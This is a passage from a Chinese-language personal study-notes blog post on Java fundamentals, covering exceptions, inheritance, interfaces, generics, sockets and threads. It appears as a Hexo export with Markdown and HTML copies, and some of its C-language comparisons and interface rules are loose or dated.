程序代码\n}\n```\n\n上面的代码段包含了 3 个 catch块。\n\n可以在 try 语句后面添加任意数量的 catch 块。\n\n如果保护代码中发生异常，异常被抛给第一个 catch 块。\n\n如果抛出异常的数据类型与 ExceptionType1 匹配，它在这里就会被捕获。\n\n如果不匹配，它会被传递给第二个 catch 块。\n\n如此，直到异常被捕获或者通过所有的 catch 块。\n\n### throws/throw 关键字：\n\n如果一个方法没有捕获到一个检查性异常，那么该方法必须使用 throws 关键字来声明。throws 关键字放在方法签名的尾部。\n\n也可以使用 throw 关键字抛出一个异常，无论它是新实例化的还是刚捕获到的。\n\n下面方法的声明抛出一个 RemoteException 异常：\n\n```java\nimport java.io.*;\npublic class className\n{\n  public void deposit(double amount) throws RemoteException\n  {\n    // Method implementation\n    throw new RemoteException();\n  }\n  //Remainder of class definition\n}\n```\n\n一个方法可以声明抛出多个异常，多个异常之间用逗号隔开。\n\n```java\nimport java.io.*;\npublic class className\n{\n   public void withdraw(double amount) throws RemoteException,\n                              InsufficientFundsException\n   {\n       // Method implementation\n   }\n   //Remainder of class definition\n}\n```\n\n### finally关键字\n\nfinally 关键字用来创建在 try 代码块后面执行的代码块。\n\n无论是否发生异常，finally 代码块中的代码总会被执行。\n\n在 finally 代码块中，可以运行清理类型等收尾善后性质的语句。\n\nfinally 代码块出现在 catch 代码块最后，语法如下：\n\n```java\ntry{\n  // 程序代码\n}catch(异常类型1 异常的变量名1){\n  // 程序代码\n}catch(异常类型2 异常的变量名2){\n  // 程序代码\n}finally{\n  // 程序代码\n}\n```\n\n**注意事项：**\n\n- catch 不能独立于 try 存在。\n- 在 try/catch 后面添加 finally 块并非强制性要求的。\n- try 代码后不能既没 catch 块也没 finally 块。\n- try, catch, finally 块之间不能添加任何代码。\n\n## JAVA继承\n\njava的继承和C语言差不多，除了java的类不能多继承，但类可以多继承接口。\n\n## 继承关键字\n\n继承可以使用 extends 和 implements 这两个关键字来实现继承，而且所有的类都是继承于 java.lang.Object，当一个类没有继承的两个关键字，则默认继承object（这个类在 **java.lang** 包中，所以不需要 **import**）祖先类。\n\n### extends关键字\n\n在 Java 中，类的继承是单一继承，也就是说，一个子类只能拥有一个父类，所以 extends 只能继承一个类。\n\n```java\npublic class Animal { \n    private String name;   \n    private int id; \n    public Animal(String myName, String myId) { \n        name= myName;\n        id= myId;\n        //初始化属性值的具体实现\n    } \n    public void eat() {  //吃东西方法的具体实现  } \n    public void sleep() { //睡觉方法的具体实现  } \n} \n \npublic class Penguin  extends  Animal{ \n    public Penguin(String myName,String myId){\n    \tsuper(myName, myId)\t\t//直接调用父类构造方法\n    }\n}\n```\n\n\n\n### implements关键字\n\n使用 implements 关键字可以变相的使java具有多继承的特性，使用范围为类继承接口的情况，可以同时继承多个接口（接口跟接口之间采用逗号分隔）。\n\n```java\npublic interface A {\n    public void eat();\n    public void sleep();\n}\n \npublic interface B {\n    public void show();\n}\n \npublic class C implements A,B {\n}\n```\n\n\n\n### super 与 this 关键字\n\n**super**关键字：我们可以通过super关键字来实现对父类成员的访问，用来引用当前对象的父类。\n\n**super()**函数：可以用于调用直接父类构造函数。\n\n如果父类构造函数没有参数，则在子类的构造器中不需要使用 **super** 关键字调用父类构造器，系统会自动调用父类的无参构造函数。\n\n**this**关键字：指向本类的引用。\n\n**PS：**使用super调用父类函数中有this关键字时，this指向的不是本类（子类）的引用，不会改变本类的成员变量，也就是不会改变本类的状态。\n\n**实例**\n\n```java\nclass Animal {\n  void eat() {\n    System.out.println(\"animal : eat\");\n  }\n}\n \nclass Dog extends Animal {\n  void eat() {\n    System.out.println(\"dog : eat\");\n  }\n  void eatTest() {\n    this.eat();   // this 调用自己的方法\n    super.eat();  // super 调用父类方法\n  }\n}\n \npublic class Test {\n  public static void main(String[] args) {\n    Animal a = new Animal();\n    a.eat();\n    Dog d = new Dog();\n    d.eatTest();\n  }\n}\n```\n\n输出结果为：\n\n```\nanimal : eat\ndog : eat\nanimal : eat\n```\n\n### final关键字\n\nfinal 关键字声明类可以把类定义为不能继承的，即最终类；或者用于修饰方法，该方法不能被子类重写：\n\n- 声明类：\n\n  ```java\n  final class 类名 {//类体}\n  ```\n\n- 声明方法：\n\n  ```java\n  修饰符(public/private/default/protected) final 返回值类型 方法名(){//方法体}\n  ```\n\n**注**:实例变量也可以被定义为 final，被定义为 final 的变量不能被修改。被声明为 final 类的方法自动地声明为 final，但是实例变量并不是 final\n\n### 继承的特性\n\n- 子类拥有父类非 private 的属性、方法。\n- 子类可以拥有自己的属性和方法，即子类可以对父类进行扩展。\n- 子类可以用自己的方式实现父类的方法。\n- Java 的继承是单继承，但是可以多重继承，单继承就是一个子类只能继承一个父类，多重继承就是，例如 A 类继承 B 类，B 类继承 C 类，所以按照关系就是 C 类是 B 类的父类，B 类是 A 类的父类，这是 Java 继承区别于 C++ 继承的一个特性。\n- 提高了类之间的耦合性（继承的缺点，耦合度高就会造成代码之间的联系越紧密，代码独立性越差）。\n\n## Java 重写(Override)与重载(Overload)\n\n### 方法的重写规则\n\n- 参数列表与被重写方法的参数列表必须完全相同。\n- 返回类型与被重写方法的返回类型可以不相同，但是必须是父类返回值的派生类（java5 及更早版本返回类型要一样，java7 及更高版本可以不同）。\n- 访问权限不能比父类中被重写的方法的访问权限更低。例如：如果父类的一个方法被声明为 public，那么在子类中重写该方法就不能声明为 protected。\n- 父类的成员方法只能被它的子类重写。\n- 声明为 final 的方法不能被重写。\n- 声明为 static 的方法不能被重写，但是能够被再次声明。\n- 子类和父类在同一个包中，那么子类可以重写父类所有方法，除了声明为 private 和 final 的方法。\n- 子类和父类不在同一个包中，那么子类只能够重写父类的声明为 public 和 protected 的非 final 方法。\n- 重写的方法能够抛出任何非强制异常，无论被重写的方法是否抛出异常。但是，重写的方法不能抛出新的强制性异常，或者比被重写方法声明的更广泛的强制性异常，反之则可以。\n- 构造方法不能被重写。\n- 如果不能继承一个类，则不能重写该类的方法。\n\n### 重载(Overload)\n\n重载(overloading) 是在一个类里面，方法名字相同，而参数不同。返回类型可以相同也可以不同。\n\n每个重载的方法（或者构造函数）都必须有一个独一无二的参数类型列表。\n\n最常用的地方就是构造器（构造函数）的重载。\n\n**重载规则:**\n\n- 被重载的方法必须改变参数列表(参数个数或类型不一样)；\n- 被重载的方法可以改变返回类型；\n- 被重载的方法可以改变访问修饰符；\n- 被重载的方法可以声明新的或更广的检查异常；\n- 方法能够在同一个类中或者在一个子类中被重载。\n- **无法以返回值类型作为重载函数的区分标准**。（跟C语言类似）\n\n## Java 多态\n\n### 多态存在的三个必要条件\n\n- 继承\n- 重写\n- **父类引用指向子类对象**：**Parent p = new Child();** （关键点！！！）\n\n## 虚函数\n\n虚函数的存在是为了多态。\n\nJava 中其实没有虚函数的概念，它的普通函数就相当于 C++ 的虚函数，动态绑定是Java的默认行为。如果 Java 中不希望某个函数具有虚函数特性，可以加上 final 关键字变成非虚函数。\n\n### 重写\n\n当子类对象调用重写的方法时，调用的是子类的方法，而不是父类中被重写的方法。\n\n要想调用父类中被重写的方法，则必须使用关键字 **super**。\n\n（这也是为什么super()函数调用父类构造方法中有this时，不会改变子类的状态，它调用的是父类的引用，改变的是父类的状态，即使这个父类根本用不到）\n\n## 抽象方法\n\n如果你想设计这样一个类，该类包含一个特别的成员方法，该方法的具体实现由它的子类确定，那么你可以在父类中声明该方法为抽象方法。\n\nAbstract 关键字同样可以用来声明抽象方法，抽象方法只包含一个方法名，而没有方法体。\n\n抽象方法没有定义，方法名后面直接跟一个分号，而不是花括号。\n\n```java\npublic abstract class Employee\n{\n   private String name;\n   private String address;\n   private int number;\n   \n   public abstract double computePay();\n   \n   //其余代码\n}\n```\n\n声明抽象方法会造成以下两个结果：\n\n- 如果一个类包含抽象方法，那么该类必须是抽象类。\n- 任何子类必须重写父类的抽象方法，或者声明自身为抽象类。\n\n继承抽象方法的子类必须重写该方法。否则，该子类也必须声明为抽象类。最终，必须有子类实现该抽象方法，否则，从最初的父类到最终的子类都不能用来实例化对象。\n\n**就跟C语言差不多**\n\n## Java 接口\n\n接口（英文：Interface），在JAVA编程语言中是一个抽象类型，是抽象方法的集合，接口通常以interface来声明。一个类通过继承接口的方式，从而来继承接口的抽象方法。\n\n接口并不是类，编写接口的方式和类很相似，但是它们属于不同的概念。类描述对象的属性和方法。接口则包含类要实现的方法。\n\n除非实现接口的类是抽象类，否则该类要定义接口中的所有方法。\n\n接口无法被实例化，但是可以被实现。一个实现接口的类，必须实现接口内所描述的所有方法，否则就必须声明为抽象类。另外，在 Java 中，接口类型可用来声明一个变量，他们可以成为一个空指针，或是被绑定在一个以此接口实现的对象。\n\n### 接口与类相似点：\n\n- 一个接口可以有多个方法。\n- 接口文件保存在 .java 结尾的文件中，文件名使用接口名。\n- 接口的字节码文件保存在 .class 结尾的文件中。\n- 接口相应的字节码文件必须在与包名称相匹配的目录结构中。\n\n### 接口与类的区别：\n\n- 接口不能用于实例化对象。\n- 接口没有构造方法。\n- 接口中所有的方法必须是抽象方法。\n- 接口不能包含成员变量，除了 static 和 final 变量。\n- 接口不是被类继承了，而是要被类实现。\n- 接口支持多继承。\n\n### 接口特性\n\n- 接口和接口中每一个方法都是是隐式抽象的,接口中的方法会被隐式的指定为 **public abstract**（只能是 public abstract，其他修饰符都会报错）。\n- 接口中可以含有变量，但是接口中的变量会被隐式的指定为 **public static final** 变量（并且只能是 public，用 private 修饰会报编译错误）。\n- 接口中的方法是不能在接口中实现的，只能由实现接口的类来实现接口中的方法。\n\n### 抽象类和接口的区别\n\n- 1.抽象类中的方法可以有方法体，就是能实现方法的具体功能，但是接口中的方法不行。\n- 2.抽象类中的成员变量可以是各种类型的，而接口中的成员变量只能是 **public static final** 类型的。\n- 3.接口中不能含有静态代码块以及静态方法(用 static 修饰的方法)，而抽象类是可以有静态代码块和静态方法。\n- 4.一个类只能继承一个抽象类，而一个类却可以实现多个接口。\n\n### 标记接口\n\n最常用的继承接口是没有包含任何方法的接口。\n\n**标记接口是没有任何方法和属性的接口.它仅仅表明它的类属于一个特定的类型,供其他代码来测试允许做一些事情。**\n\n标记接口作用：简单形象的说就是给某个对象打个标（盖个戳），使对象拥有某个或某些特权。\n\n例如：java.awt.event 包中的 MouseListener 接口继承的 java.util.EventListener 接口定义如下：\n\n```java\npackage java.util;\npublic interface EventListener\n{}\n```\n\n没有任何方法的接口被称为标记接口。标记接口主要用于以下两种目的：\n\n- 建立一个公共的父接口：\n\n  正如EventListener接口，这是由几十个其他接口扩展的Java API，你可以使用一个标记接口来建立一组接口的父接口。例如：当一个接口继承了EventListener接口，Java虚拟机(JVM)就知道该接口将要被用于一个事件的代理方案。\n\n- 向一个类添加数据类型：\n\n  这种情况是标记接口最初的目的，实现标记接口的类不需要定义任何接口方法(因为标记接口根本就没有方法)，但是该类通过多态性变成一个接口类型。\n\n**通俗说法**：\n\n以Serializable接口为例。一个类实现了这个接口，说明它可以被序列化。因此，我们实际上通过Serializable这个接口，给该类标记了“可被序列化”的元数据，打上了“可被序列化”的标签。这也是标记/标签接口名字的由来。\n\n一个类实现Serializable接口，使得我们可以用 *instanceof* 对类进行类型查询*,*例如：\n\n​    *if(obj instanceof Serializable) {………}*\n\n## java包\n\n语法：\n\n```java\npackage ...\t//定义一个包（表明接下来定义的这个类、接口、枚举或注释在该包中）\n例：\n    package net.java.util;\t//说明这个类在net.java.util这个包里\n      \nimport package1[.package2…].(classname);\t//引入一个包或类，使接下来可以直接使用这个包中的类\n例：\n    import net.java.util.*;\t\t//引入net.java.util包中的所有类\n\timport net.java.util.Something;\t\t//引入net.java.util包中的Something类\n```\n\n### package的目录结构\n\n类放在包中会有两种主要的结果：\n\n- 包名成为类名的一部分，正如我们前面讨论的一样。\n- 包名必须与相应的字节码所在的目录结构相吻合。\n\n例如上面的 net.java.util这个包，它里面的类的java文件的路径就是：\n\n\\sources\\net\\java\\util\\ *.java\n\nclass文件的的路径就是：\n\n\\classes\\net\\java\\util\\ *.class\n\n## 泛型\n\n### 泛型方法（C语言中的模板）\n\n你可以写一个泛型方法，该方法在调用时可以接收不同类型的参数。根据传递给泛型方法的参数类型，编译器适当地处理每一个方法调用。\n\n下面是定义泛型方法的规则：\n\n- 所有泛型方法声明都有一个类型参数声明部分（由尖括号分隔），**该类型参数声明部分在方法返回类型之前**（在下面例子中的<E>）。\n- 每一个类型参数声明部分包含一个或多个类型参数，参数间用逗号隔开。一个泛型参数，也被称为一个类型变量，是用于指定一个泛型类型名称的标识符。\n- 类型参数能被用来声明返回值类型，并且能作为泛型方法得到的实际参数类型的占位符。\n- 泛型方法体的声明和其他方法一样。注意**类型参数只能代表引用型类型，不能是原始类型**（像int,double,char的等）。\n\n**实例：**\n\n```java\npublic class GenericMethodTest\n{\n   // 泛型方法 printArray                         \n   public static < E > void printArray( E[] inputArray )\n   {\n      // 输出数组元素            \n         for ( E element : inputArray ){        \n            System.out.printf( \"%s \", element );\n         }\n         System.out.println();\n    }\n \n    public static void main( String args[] )\n    {\n        // 创建不同类型数组： Integer, Double 和 Character\n        Integer[] intArray = { 1, 2, 3, 4, 5 };\n        Double[] doubleArray = { 1.1, 2.2, 3.3, 4.4 };\n        Character[] charArray = { 'H', 'E', 'L', 'L', 'O' };\n \n        System.out.println( \"整型数组元素为:\" );\n        printArray( intArray  ); // 传递一个整型数组\n \n        System.out.println( \"\\n双精度型数组元素为:\" );\n        printArray( doubleArray ); // 传递一个双精度型数组\n \n        System.out.println( \"\\n字符型数组元素为:\" );\n        printArray( charArray ); // 传递一个字符型数组\n    } \n}\n```\n\n## Java 网络编程\n\n### Socket 编程\n\n套接字使用TCP提供了两台计算机之间的通信机制。 客户端程序创建一个套接字，并尝试连接服务器的套接字。\n\n当连接建立时，服务器会创建一个 Socket 对象。客户端和服务器现在可以通过对 Socket 对象的写入和读取来进行通信。\n\njava.net.Socket 类代表一个套接字，并且 java.net.ServerSocket 类为服务器程序提供了一种来监听客户端，并与他们建立连接的机制。\n\n以下步骤在两台计算机之间使用套接字建立TCP连接时会出现：\n\n- **服务器实例化一个 ServerSocket 对象，表示通过服务器上的端口通信。**\n- **服务器调用 ServerSocket 类的 accept() 方法，该方法将一直等待，直到客户端连接到服务器上给定的端口。**\n- **服务器正在等待时，一个客户端实例化一个 Socket 对象，指定服务器名称和端口号来请求连接。**\n- **Socket 类的构造函数试图将客户端连接到指定的服务器和端口号。如果通信被建立，则在客户端创建一个 Socket 对象能够与服务器进行通信。**\n- **在服务器端，accept() 方法返回服务器上一个新的 socket 引用，该 socket 连接到客户端的 socket。**\n\n连接建立后，通过使用 I/O 流在进行通信，每一个socket都有一个输出流和一个输入流，客户端的输出流连接到服务器端的输入流，而客户端的输入流连接到服务器端的输出流。\n\nTCP 是一个双向的通信协议，因此数据可以通过两个数据流在同一时间发送。\n\n## Java 多线程编程\n\n### 线程的优先级\n\n每一个 Java 线程都有一个优先级，这样有助于操作系统确定线程的调度顺序。\n\nJava 线程的优先级是一个整数，其取值范围是 1 （Thread.MIN_PRIORITY ） - 10 （Thread.MAX_PRIORITY ）。\n\n默认情况下，每一个线程都会分配一个优先级 NORM_PRIORITY（5）。\n\n具有较高优先级的线程对程序更重要，并且应该在低优先级的线程之前分配处理器资源。但是，线程优先级不能保证线程执行的顺序，而且非常依赖于平台。\n\n**共有以下三种方法来创建多线程**\n\n### 通过实现 Runnable 接口来创建线程\n\n创建一个线程，最简单的方法是创建一个实现 Runnable 接口的类。\n\n为了实现 Runnable，一个类只需要执行一个方法调用 run()，声明如下：\n\n```java\npublic void run()\n```\n\n你可以重写该方法，重要的是理解的 run() 可以调用其他方法，使用其他类，并声明变量，就像主线程一样。\n\n在创建一个实现 Runnable 接口的类之后，你可以在类中实例化一个线程对象。\n\nThread 定义了几个构造方法，下面的这个是我们经常使用的：\n\n```java\nThread(Runnable threadOb,String threadName);\n```\n\n这里，threadOb 是一个实现 Runnable 接口的类的实例，并且 threadName 指定新线程的名字。\n\n新线程创建之后，调用它的 start() 方法它才会运行。\n\n```java\nvoid start();\n```\n\n### 通过继承Thread来创建线程\n\n创建一个线程的第二种方法是创建一个新的类，该类继承 Thread 类，然后创建一个该类的实例。\n\n继承类必须重写 run() 方法，该方法是新线程的入口点。它也必须调用 start() 方法才能执行。\n\n该方法尽管被列为一种多线程实现方式，但是本质上也是实现了 Runnable 接口的一个实例。\n\n### 通过 Callable 和 Future 创建线程\n\n- 1.创建 Callable 接口的实现类，并实现 call() 方法，该 call() 方法将作为线程执行体，并且有返回值。\n- 2.创建 Callable 实现类的实例，使用 FutureTask 类来包装 Callable 对象，该 FutureTask 对象封装了该 Callable 对象的 call() 方法的返回值。\n- 3.使用 FutureTask 对象作为 Thread 对象的 target 创建并启动新线程。\n- 4.调用 FutureTask 对象的 get() 方法来获得子线程执行结束后的返回值。\n\n\n\n## 创建线程的三种方式的对比\n\n- 1. 采用实现 Runnable、Callable 接口的方式创建多线程时，线程类只是实现了 Runnable 接口或 Callable 接口，还可以继承其他类。\n- 2. 使用继承 Thread 类的方式创建多线程时，编写简单，如果需要访问当前线程，则无需使用 Thread.currentThread() 方法，直接使用 this 即可获得当前线程。","slug":"2020-11-23-java学习笔记知识点","published":1,"updated":"2020-11-26T12:54:52.443Z","comments":1,"photos":[],"link":"","_id":"ckkntx9k9001yxov7lcpdqe5u","content":"<p>[TOC]</p>\n<h1 id=\"java学习笔记知识点\"><a href=\"#java学习笔记知识点\" class=\"headerlink\" title=\"java学习笔记知识点\"></a>java学习笔记知识点</h1><ul>\n<li>一个源文件中只能有一个 public 类</li>\n<li>一个源文件可以有多个非 public 类</li>\n</ul>\n<pre class=\"line-numbers language-java\"><code class=\"language-java\"><span class=\"token keyword\">class</span> <span class=\"token class-name\">a</span><span class=\"token punctuation\">{</span> <span class=\"token keyword\">class</span> <span class=\"token class-name\">b</span><span class=\"token punctuation\">{</span> <span class=\"token punctuation\">}</span><span class=\"token punctuation\">}</span>        这样是允许的\n<span class=\"token keyword\">class</span> <span class=\"token class-name\">a</span><span class=\"token punctuation\">{</span><span class=\"token punctuation\">}</span><span class=\"token keyword\">class</span> <span class=\"token class-name\">b</span><span class=\"token punctuation\">{</span><span class=\"token punctuation\">}</span>            这样是不允许的<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span></span></code></pre>\n<h3 id=\"类型默认值\"><a href=\"#类型默认值\" class=\"headerlink\" title=\"类型默认值\"></a>类型默认值</h3><p> Java 各个类型的默认值：</p>\n<table>\n<thead>\n<tr>\n<th align=\"left\"><strong>数据类型</strong></th>\n<th><strong>默认值</strong></th>\n</tr>\n</thead>\n<tbody><tr>\n<td align=\"left\">byte</td>\n<td>0</td>\n</tr>\n<tr>\n<td align=\"left\">short</td>\n<td>0</td>\n</tr>\n<tr>\n<td align=\"left\">int</td>\n<td>0</td>\n</tr>\n<tr>\n<td align=\"left\">long</td>\n<td>0L</td>\n</tr>\n<tr>\n<td align=\"left\">float</td>\n<td>0.0f</td>\n</tr>\n<tr>\n<td align=\"left\">double</td>\n<td>0.0d</td>\n</tr>\n<tr>\n<td align=\"left\">char</td>\n<td>‘u0000’</td>\n</tr>\n<tr>\n<td align=\"left\">String (or any object)</td>\n<td>null</td>\n</tr>\n<tr>\n<td align=\"left\">boolean</td>\n<td>false</td>\n</tr>\n</tbody></table>\n<p>Java支持的一些转义字符序列。</p>\n<table>\n<thead>\n<tr>\n<th align=\"left\">符号</th>\n<th align=\"left\">字符含义</th>\n</tr>\n</thead>\n<tbody><tr>\n<td align=\"left\">\\n</td>\n<td align=\"left\">换行 (0x0a)</td>\n</tr>\n<tr>\n<td align=\"left\">\\r</td>\n<td align=\"left\">回车 (0x0d)</td>\n</tr>\n<tr>\n<td align=\"left\">\\f</td>\n<td align=\"left\">换页符(0x0c)</td>\n</tr>\n<tr>\n<td align=\"left\">\\b</td>\n<td align=\"left\">退格 (0x08)</td>\n</tr>\n<tr>\n<td align=\"left\">\\0</td>\n<td align=\"left\">空字符 (0x0)</td>\n</tr>\n<tr>\n<td align=\"left\">\\s</td>\n<td align=\"left\">空格 (0x20)</td>\n</tr>\n<tr>\n<td align=\"left\">\\t</td>\n<td align=\"left\">制表符</td>\n</tr>\n<tr>\n<td align=\"left\">\"</td>\n<td align=\"left\">双引号</td>\n</tr>\n<tr>\n<td align=\"left\">'</td>\n<td align=\"left\">单引号</td>\n</tr>\n<tr>\n<td align=\"left\">\\</td>\n<td align=\"left\">反斜杠</td>\n</tr>\n<tr>\n<td align=\"left\">\\ddd</td>\n<td align=\"left\">八进制字符 (ddd)</td>\n</tr>\n<tr>\n<td align=\"left\">\\uxxxx</td>\n<td align=\"left\">16进制Unicode字符 (xxxx)</td>\n</tr>\n</tbody></table>\n<p>Java语言支持的变量类型有：</p>\n<ul>\n<li>类变量：独立于方法之外的变量，用 static 修饰。</li>\n<li>实例变量：独立于方法之外的变量，不过没有 static 修饰。</li>\n<li>局部变量：类的方法中的变量。</li>\n</ul>\n<h3 id=\"final-修饰符\"><a href=\"#final-修饰符\" class=\"headerlink\" title=\"final 修饰符\"></a>final 修饰符</h3><p><strong>final 变量（常量）：</strong></p>\n<p>final 表示”最后的、最终的”含义，变量一旦赋值后，不能被重新赋值。被 final 修饰的实例变量必须显式指定初始值。</p>\n<p>final 修饰符通常和 static 修饰符一起使用来创建类常量。</p>\n<h3 id=\"abstract-修饰符\"><a href=\"#abstract-修饰符\" class=\"headerlink\" title=\"abstract 修饰符\"></a>abstract 修饰符</h3><p><strong>抽象类：</strong></p>\n<p>抽象类不能用来实例化对象，声明抽象类的唯一目的是为了将来对该类进行扩充。</p>\n<p>一个类不能同时被 abstract 和 final 修饰。如果一个类包含抽象方法，那么该类一定要声明为抽象类，否则将出现编译错误。</p>\n<p>抽象类可以包含抽象方法和非抽象方法。</p>\n<h2 id=\"赋值运算符\"><a href=\"#赋值运算符\" class=\"headerlink\" title=\"赋值运算符\"></a>赋值运算符</h2><p>下面是Java语言支持的赋值运算符：</p>\n<table>\n<thead>\n<tr>\n<th align=\"left\">操作符</th>\n<th align=\"left\">描述</th>\n<th align=\"left\">例子</th>\n</tr>\n</thead>\n<tbody><tr>\n<td align=\"left\">=</td>\n<td align=\"left\">简单的赋值运算符，将右操作数的值赋给左侧操作数</td>\n<td align=\"left\">C = A + B将把A + B得到的值赋给C</td>\n</tr>\n<tr>\n<td align=\"left\">+ =</td>\n<td align=\"left\">加和赋值操作符，它把左操作数和右操作数相加赋值给左操作数</td>\n<td align=\"left\">C + = A等价于C = C + A</td>\n</tr>\n<tr>\n<td align=\"left\">- =</td>\n<td align=\"left\">减和赋值操作符，它把左操作数和右操作数相减赋值给左操作数</td>\n<td align=\"left\">C - = A等价于C = C - A</td>\n</tr>\n<tr>\n<td align=\"left\">* =</td>\n<td align=\"left\">乘和赋值操作符，它把左操作数和右操作数相乘赋值给左操作数</td>\n<td align=\"left\">C * = A等价于C = C * A</td>\n</tr>\n<tr>\n<td align=\"left\">/ =</td>\n<td align=\"left\">除和赋值操作符，它把左操作数和右操作数相除赋值给左操作数</td>\n<td align=\"left\">C / = A，C 与 A 同类型时等价于 C = C / A</td>\n</tr>\n<tr>\n<td align=\"left\">（％）=</td>\n<td align=\"left\">取模和赋值操作符，它把左操作数和右操作数取模后赋值给左操作数</td>\n<td align=\"left\">C％= A等价于C = C％A</td>\n</tr>\n<tr>\n<td align=\"left\">&lt;&lt; =</td>\n<td align=\"left\">左移位赋值运算符</td>\n<td align=\"left\">C &lt;&lt; = 2等价于C = C &lt;&lt; 2</td>\n</tr>\n<tr>\n<td align=\"left\">&gt;&gt; =</td>\n<td align=\"left\">右移位赋值运算符</td>\n<td align=\"left\">C &gt;&gt; = 2等价于C = C &gt;&gt; 2</td>\n</tr>\n<tr>\n<td align=\"left\">＆=</td>\n<td align=\"left\">按位与赋值运算符</td>\n<td align=\"left\">C＆= 2等价于C = C＆2</td>\n</tr>\n<tr>\n<td align=\"left\">^ =</td>\n<td align=\"left\">按位异或赋值操作符</td>\n<td align=\"left\">C ^ = 2等价于C = C ^ 2</td>\n</tr>\n<tr>\n<td align=\"left\">| =</td>\n<td align=\"left\">按位或赋值操作符</td>\n<td align=\"left\">C | = 2等价于C = C | 2</td>\n</tr>\n</tbody></table>\n<h2 id=\"instanceof-运算符\"><a href=\"#instanceof-运算符\" class=\"headerlink\" title=\"instanceof 运算符\"></a>instanceof 运算符</h2><p>该运算符用于操作对象实例，检查该对象是否是一个特定类型（类类型或接口类型）。</p>\n<p>instanceof运算符使用格式如下：</p>\n<pre><code>( Object reference variable ) instanceof  (class/interface type)</code></pre><p>如果运算符左侧变量所指的对象，是操作符右侧类或接口(class/interface)的一个对象，那么结果为真。</p>\n<p>下面是一个例子：</p>\n<pre><code>String name = \"James\";\nboolean result = name instanceof String; // 由于 name 是 String 类型，所以返回真</code></pre><p>如果被比较的对象兼容于右侧类型,该运算符仍然返回true。</p>\n<p>看下面的例子：</p>\n<pre class=\"line-numbers language-java\"><code class=\"language-java\"><span class=\"token keyword\">class</span> <span class=\"token class-name\">Vehicle</span> <span class=\"token punctuation\">{</span><span class=\"token punctuation\">}</span>\n\n<span class=\"token keyword\">public</span> <span class=\"token keyword\">class</span> <span class=\"token class-name\">Car</span> <span class=\"token keyword\">extends</span> <span class=\"token class-name\">Vehicle</span> <span class=\"token punctuation\">{</span>\n   <span class=\"token keyword\">public</span> <span class=\"token keyword\">static</span> <span class=\"token keyword\">void</span> <span class=\"token function\">main</span><span class=\"token punctuation\">(</span>String<span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span> args<span class=\"token punctuation\">)</span><span class=\"token punctuation\">{</span>\n      Vehicle a <span class=\"token operator\">=</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">Car</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n      <span class=\"token keyword\">boolean</span> result <span class=\"token operator\">=</span>  a <span class=\"token keyword\">instanceof</span> <span class=\"token class-name\">Car</span><span class=\"token punctuation\">;</span>\n      System<span class=\"token punctuation\">.</span>out<span class=\"token punctuation\">.</span><span class=\"token function\">println</span><span class=\"token punctuation\">(</span> result<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n   <span class=\"token punctuation\">}</span>\n<span class=\"token punctuation\">}</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n<h2 id=\"Java-增强-for-循环\"><a href=\"#Java-增强-for-循环\" class=\"headerlink\" title=\"Java 增强 for 循环\"></a>Java 增强 for 循环</h2><p>Java5 引入了一种主要用于数组的增强型 for 循环。</p>\n<p>Java 增强 for 循环语法格式如下:</p>\n<p>for(声明语句 : 表达式) {   //代码句子 }</p>\n<p><strong>声明语句：</strong>声明新的局部变量，该变量的类型必须和数组元素的类型匹配。其作用域限定在循环语句块，其值与此时数组元素的值相等。</p>\n<p><strong>表达式：</strong>表达式是要访问的数组名，或者是返回值为数组的方法。</p>\n<p><strong>实例：</strong></p>\n<pre class=\"line-numbers language-java\"><code class=\"language-java\"><span class=\"token keyword\">public</span> <span class=\"token keyword\">class</span> <span class=\"token class-name\">Test</span> <span class=\"token punctuation\">{</span>\n   <span class=\"token keyword\">public</span> <span class=\"token keyword\">static</span> <span class=\"token keyword\">void</span> <span class=\"token function\">main</span><span class=\"token punctuation\">(</span>String args<span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">{</span>\n      <span class=\"token keyword\">int</span> <span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span> numbers <span class=\"token operator\">=</span> <span class=\"token punctuation\">{</span><span class=\"token number\">10</span><span class=\"token punctuation\">,</span> <span class=\"token number\">20</span><span class=\"token punctuation\">,</span> <span class=\"token number\">30</span><span class=\"token punctuation\">,</span> <span class=\"token number\">40</span><span class=\"token punctuation\">,</span> <span class=\"token number\">50</span><span class=\"token punctuation\">}</span><span class=\"token punctuation\">;</span>\n\n      <span class=\"token keyword\">for</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">int</span> x <span class=\"token operator\">:</span> numbers <span class=\"token punctuation\">)</span><span class=\"token punctuation\">{</span>\n         System<span class=\"token punctuation\">.</span>out<span class=\"token punctuation\">.</span><span class=\"token function\">print</span><span class=\"token punctuation\">(</span> x <span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n         System<span class=\"token punctuation\">.</span>out<span class=\"token punctuation\">.</span><span class=\"token function\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">\",\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n      <span class=\"token punctuation\">}</span>\n      System<span class=\"token punctuation\">.</span>out<span class=\"token punctuation\">.</span><span class=\"token function\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"\\n\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n      String <span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span> names <span class=\"token operator\">=</span><span class=\"token punctuation\">{</span><span class=\"token string\">\"James\"</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"Larry\"</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"Tom\"</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"Lacy\"</span><span class=\"token punctuation\">}</span><span class=\"token punctuation\">;</span>\n      <span class=\"token keyword\">for</span><span class=\"token punctuation\">(</span> String name <span class=\"token operator\">:</span> names <span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n         System<span class=\"token punctuation\">.</span>out<span class=\"token punctuation\">.</span><span class=\"token function\">print</span><span class=\"token punctuation\">(</span> name <span class=\"token punctuation\">)</span><span class=\"token 